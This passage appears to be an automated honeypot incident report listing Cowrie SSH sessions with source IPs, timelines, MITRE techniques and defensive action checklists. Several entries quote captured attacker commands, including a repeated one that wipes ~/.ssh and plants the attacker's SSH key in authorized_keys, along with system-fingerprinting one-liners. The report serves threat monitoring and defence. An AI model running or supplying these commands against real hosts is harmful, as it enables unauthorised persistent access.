| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-08 21:49 |
| **Last Seen** | 2026-07-08 21:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:49:26` | `cowrie.session.connect` |
| `2026-07-08 21:49:26` | `cowrie.client.version` |
| `2026-07-08 21:49:27` | `cowrie.client.kex` |
| `2026-07-08 21:49:27` | `cowrie.login.success` |
| `2026-07-08 21:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b15033136495

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-08 21:49 |
| **Last Seen** | 2026-07-08 21:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:49:32` | `cowrie.session.connect` |
| `2026-07-08 21:49:32` | `cowrie.client.version` |
| `2026-07-08 21:49:32` | `cowrie.client.kex` |
| `2026-07-08 21:49:33` | `cowrie.login.success` |
| `2026-07-08 21:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e25a7e86890d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-08 21:49 |
| **Last Seen** | 2026-07-08 21:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:49:33` | `cowrie.session.connect` |
| `2026-07-08 21:49:33` | `cowrie.client.version` |
| `2026-07-08 21:49:33` | `cowrie.client.kex` |
| `2026-07-08 21:49:34` | `cowrie.login.success` |
| `2026-07-08 21:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e873e74f66a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:49 |
| **Last Seen** | 2026-07-08 21:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:49:37` | `cowrie.session.connect` |
| `2026-07-08 21:49:38` | `cowrie.client.version` |
| `2026-07-08 21:49:38` | `cowrie.client.kex` |
| `2026-07-08 21:49:39` | `cowrie.login.success` |
| `2026-07-08 21:49:40` | `cowrie.session.params` |
| `2026-07-08 21:49:40` | `cowrie.command.input` |
| `2026-07-08 21:49:40` | `cowrie.command.input` |
| `2026-07-08 21:49:40` | `cowrie.command.input` |
| `2026-07-08 21:49:40` | `cowrie.command.input` |
| `2026-07-08 21:49:40` | `cowrie.command.input` |
| `2026-07-08 21:49:40` | `cowrie.command.success` |
| `2026-07-08 21:49:40` | `cowrie.command.input` |
| `2026-07-08 21:49:40` | `cowrie.command.input` |
| `2026-07-08 21:49:40` | `cowrie.command.input` |
| `2026-07-08 21:49:40` | `cowrie.command.input` |
| `2026-07-08 21:49:41` | `cowrie.log.closed` |
| `2026-07-08 21:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f316b57af1ff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:51 |
| **Last Seen** | 2026-07-08 21:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:51:53` | `cowrie.session.connect` |
| `2026-07-08 21:51:53` | `cowrie.client.version` |
| `2026-07-08 21:51:53` | `cowrie.client.kex` |
| `2026-07-08 21:51:55` | `cowrie.login.success` |
| `2026-07-08 21:51:56` | `cowrie.session.params` |
| `2026-07-08 21:51:56` | `cowrie.command.input` |
| `2026-07-08 21:51:56` | `cowrie.command.input` |
| `2026-07-08 21:51:56` | `cowrie.command.input` |
| `2026-07-08 21:51:56` | `cowrie.command.input` |
| `2026-07-08 21:51:56` | `cowrie.command.input` |
| `2026-07-08 21:51:56` | `cowrie.command.success` |
| `2026-07-08 21:51:56` | `cowrie.command.input` |
| `2026-07-08 21:51:56` | `cowrie.command.input` |
| `2026-07-08 21:51:56` | `cowrie.command.input` |
| `2026-07-08 21:51:56` | `cowrie.command.input` |
| `2026-07-08 21:51:56` | `cowrie.log.closed` |
| `2026-07-08 21:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7551513d5b5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 21:53 |
| **Last Seen** | 2026-07-08 21:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:53:42` | `cowrie.session.connect` |
| `2026-07-08 21:53:42` | `cowrie.client.version` |
| `2026-07-08 21:53:43` | `cowrie.client.kex` |
| `2026-07-08 21:53:43` | `cowrie.login.success` |
| `2026-07-08 21:53:43` | `cowrie.session.params` |
| `2026-07-08 21:53:43` | `cowrie.command.input` |
| `2026-07-08 21:53:44` | `cowrie.log.closed` |
| `2026-07-08 21:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30376637c50

| Field | Detail |
|---|---|
| **Source IP** | `219.248.65[.]30` |
| **First Seen** | 2026-07-08 21:53 |
| **Last Seen** | 2026-07-08 21:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:53:51` | `cowrie.session.connect` |
| `2026-07-08 21:53:52` | `cowrie.client.version` |
| `2026-07-08 21:53:52` | `cowrie.client.kex` |
| `2026-07-08 21:53:54` | `cowrie.login.success` |
| `2026-07-08 21:53:55` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.248.65[.]30` to AbuseIPDB if not already reported
- [ ] Block `219.248.65[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7111a048c81c

| Field | Detail |
|---|---|
| **Source IP** | `121.179.93[.]147` |
| **First Seen** | 2026-07-08 21:55 |
| **Last Seen** | 2026-07-08 21:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:55:05` | `cowrie.session.connect` |
| `2026-07-08 21:55:06` | `cowrie.client.version` |
| `2026-07-08 21:55:06` | `cowrie.client.kex` |
| `2026-07-08 21:55:09` | `cowrie.login.success` |
| `2026-07-08 21:55:10` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.179.93[.]147` to AbuseIPDB if not already reported
- [ ] Block `121.179.93[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3273c52c7449

| Field | Detail |
|---|---|
| **Source IP** | `195.158.26[.]59` |
| **First Seen** | 2026-07-08 21:55 |
| **Last Seen** | 2026-07-08 21:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:55:20` | `cowrie.session.connect` |
| `2026-07-08 21:55:21` | `cowrie.client.version` |
| `2026-07-08 21:55:21` | `cowrie.client.kex` |
| `2026-07-08 21:55:23` | `cowrie.login.success` |
| `2026-07-08 21:55:24` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.158.26[.]59` to AbuseIPDB if not already reported
- [ ] Block `195.158.26[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d62adf48038

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 21:57 |
| **Last Seen** | 2026-07-08 21:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:57:13` | `cowrie.session.connect` |
| `2026-07-08 21:57:14` | `cowrie.client.version` |
| `2026-07-08 21:57:14` | `cowrie.client.kex` |
| `2026-07-08 21:57:18` | `cowrie.login.success` |
| `2026-07-08 21:57:22` | `cowrie.session.params` |
| `2026-07-08 21:57:22` | `cowrie.command.input` |
| `2026-07-08 21:57:23` | `cowrie.log.closed` |
| `2026-07-08 21:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4711939397f1

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]137` |
| **First Seen** | 2026-07-08 21:59 |
| **Last Seen** | 2026-07-08 21:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:59:44` | `cowrie.session.connect` |
| `2026-07-08 21:59:45` | `cowrie.login.success` |
| `2026-07-08 21:59:46` | `cowrie.session.params` |
| `2026-07-08 21:59:46` | `cowrie.command.input` |
| `2026-07-08 21:59:46` | `cowrie.command.input` |
| `2026-07-08 21:59:47` | `cowrie.command.input` |
| `2026-07-08 21:59:48` | `cowrie.command.input` |
| `2026-07-08 21:59:48` | `cowrie.command.failed` |
| `2026-07-08 21:59:48` | `cowrie.log.closed` |
| `2026-07-08 21:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]137` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70ee9a235252

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-08 21:59 |
| **Last Seen** | 2026-07-08 21:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:59:47` | `cowrie.session.connect` |
| `2026-07-08 21:59:47` | `cowrie.client.version` |
| `2026-07-08 21:59:47` | `cowrie.client.kex` |
| `2026-07-08 21:59:48` | `cowrie.login.success` |
| `2026-07-08 21:59:48` | `cowrie.session.params` |
| `2026-07-08 21:59:48` | `cowrie.command.input` |
| `2026-07-08 21:59:48` | `cowrie.log.closed` |
| `2026-07-08 21:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9613ccefabdc

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-08 22:01 |
| **Last Seen** | 2026-07-08 22:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:01:40` | `cowrie.session.connect` |
| `2026-07-08 22:01:40` | `cowrie.client.version` |
| `2026-07-08 22:01:41` | `cowrie.client.kex` |
| `2026-07-08 22:01:41` | `cowrie.login.success` |
| `2026-07-08 22:01:42` | `cowrie.session.params` |
| `2026-07-08 22:01:42` | `cowrie.command.input` |
| `2026-07-08 22:01:42` | `cowrie.log.closed` |
| `2026-07-08 22:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36c1e380f606

| Field | Detail |
|---|---|
| **Source IP** | `45.158.21[.]122` |
| **First Seen** | 2026-07-08 22:02 |
| **Last Seen** | 2026-07-08 22:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:02:28` | `cowrie.session.connect` |
| `2026-07-08 22:02:28` | `cowrie.client.version` |
| `2026-07-08 22:02:29` | `cowrie.client.kex` |
| `2026-07-08 22:02:29` | `cowrie.login.success` |
| `2026-07-08 22:02:29` | `cowrie.session.params` |
| `2026-07-08 22:02:29` | `cowrie.command.input` |
| `2026-07-08 22:02:29` | `cowrie.command.failed` |
| `2026-07-08 22:02:30` | `cowrie.log.closed` |
| `2026-07-08 22:02:30` | `cowrie.session.params` |
| `2026-07-08 22:02:30` | `cowrie.command.input` |
| `2026-07-08 22:02:30` | `cowrie.session.file_download` |
| `2026-07-08 22:02:30` | `cowrie.log.closed` |
| `2026-07-08 22:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.21[.]122` to AbuseIPDB if not already reported
- [ ] Block `45.158.21[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-564b502f13ed

| Field | Detail |
|---|---|
| **Source IP** | `45.158.21[.]122` |
| **First Seen** | 2026-07-08 22:02 |
| **Last Seen** | 2026-07-08 22:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:02:30` | `cowrie.session.connect` |
| `2026-07-08 22:02:30` | `cowrie.client.version` |
| `2026-07-08 22:02:31` | `cowrie.client.kex` |
| `2026-07-08 22:02:31` | `cowrie.login.success` |
| `2026-07-08 22:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.21[.]122` to AbuseIPDB if not already reported
- [ ] Block `45.158.21[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aa4bddbbad0

| Field | Detail |
|---|---|
| **Source IP** | `45.158.21[.]122` |
| **First Seen** | 2026-07-08 22:02 |
| **Last Seen** | 2026-07-08 22:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:02:31` | `cowrie.session.connect` |
| `2026-07-08 22:02:31` | `cowrie.client.version` |
| `2026-07-08 22:02:31` | `cowrie.client.kex` |
| `2026-07-08 22:02:31` | `cowrie.login.success` |
| `2026-07-08 22:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.21[.]122` to AbuseIPDB if not already reported
- [ ] Block `45.158.21[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29b234941fc1

| Field | Detail |
|---|---|
| **Source IP** | `168.196.132[.]34` |
| **First Seen** | 2026-07-08 22:05 |
| **Last Seen** | 2026-07-08 22:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:05:05` | `cowrie.session.connect` |
| `2026-07-08 22:05:05` | `cowrie.client.version` |
| `2026-07-08 22:05:05` | `cowrie.client.kex` |
| `2026-07-08 22:05:05` | `cowrie.login.success` |
| `2026-07-08 22:05:06` | `cowrie.session.params` |
| `2026-07-08 22:05:06` | `cowrie.command.input` |
| `2026-07-08 22:05:06` | `cowrie.command.failed` |
| `2026-07-08 22:05:06` | `cowrie.log.closed` |
| `2026-07-08 22:05:07` | `cowrie.session.params` |
| `2026-07-08 22:05:07` | `cowrie.command.input` |
| `2026-07-08 22:05:07` | `cowrie.session.file_download` |
| `2026-07-08 22:05:07` | `cowrie.log.closed` |
| `2026-07-08 22:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.196.132[.]34` to AbuseIPDB if not already reported
- [ ] Block `168.196.132[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-539a7890ddd0

| Field | Detail |
|---|---|
| **Source IP** | `168.196.132[.]34` |
| **First Seen** | 2026-07-08 22:05 |
| **Last Seen** | 2026-07-08 22:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:05:08` | `cowrie.session.connect` |
| `2026-07-08 22:05:08` | `cowrie.client.version` |
| `2026-07-08 22:05:08` | `cowrie.client.kex` |
| `2026-07-08 22:05:08` | `cowrie.login.success` |
| `2026-07-08 22:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.196.132[.]34` to AbuseIPDB if not already reported
- [ ] Block `168.196.132[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f64b24066ac6

| Field | Detail |
|---|---|
| **Source IP** | `168.196.132[.]34` |
| **First Seen** | 2026-07-08 22:05 |
| **Last Seen** | 2026-07-08 22:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:05:08` | `cowrie.session.connect` |
| `2026-07-08 22:05:08` | `cowrie.client.version` |
| `2026-07-08 22:05:09` | `cowrie.client.kex` |
| `2026-07-08 22:05:09` | `cowrie.login.success` |
| `2026-07-08 22:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.196.132[.]34` to AbuseIPDB if not already reported
- [ ] Block `168.196.132[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7304c464a2b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 22:05 |
| **Last Seen** | 2026-07-08 22:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:05:39` | `cowrie.session.connect` |
| `2026-07-08 22:05:39` | `cowrie.client.version` |
| `2026-07-08 22:05:39` | `cowrie.client.kex` |
| `2026-07-08 22:05:39` | `cowrie.login.success` |
| `2026-07-08 22:05:40` | `cowrie.session.params` |
| `2026-07-08 22:05:40` | `cowrie.command.input` |
| `2026-07-08 22:05:40` | `cowrie.log.closed` |
| `2026-07-08 22:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fa2cc26c67e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 22:07 |
| **Last Seen** | 2026-07-08 22:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:07:16` | `cowrie.session.connect` |
| `2026-07-08 22:07:17` | `cowrie.client.version` |
| `2026-07-08 22:07:17` | `cowrie.client.kex` |
| `2026-07-08 22:07:22` | `cowrie.login.success` |
| `2026-07-08 22:07:26` | `cowrie.session.params` |
| `2026-07-08 22:07:26` | `cowrie.command.input` |
| `2026-07-08 22:07:27` | `cowrie.log.closed` |
| `2026-07-08 22:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40953d145218

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-07-08 22:14 |
| **Last Seen** | 2026-07-08 22:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:14:23` | `cowrie.session.connect` |
| `2026-07-08 22:14:23` | `cowrie.client.version` |
| `2026-07-08 22:14:23` | `cowrie.client.kex` |
| `2026-07-08 22:14:24` | `cowrie.login.success` |
| `2026-07-08 22:14:24` | `cowrie.session.params` |
| `2026-07-08 22:14:24` | `cowrie.command.input` |
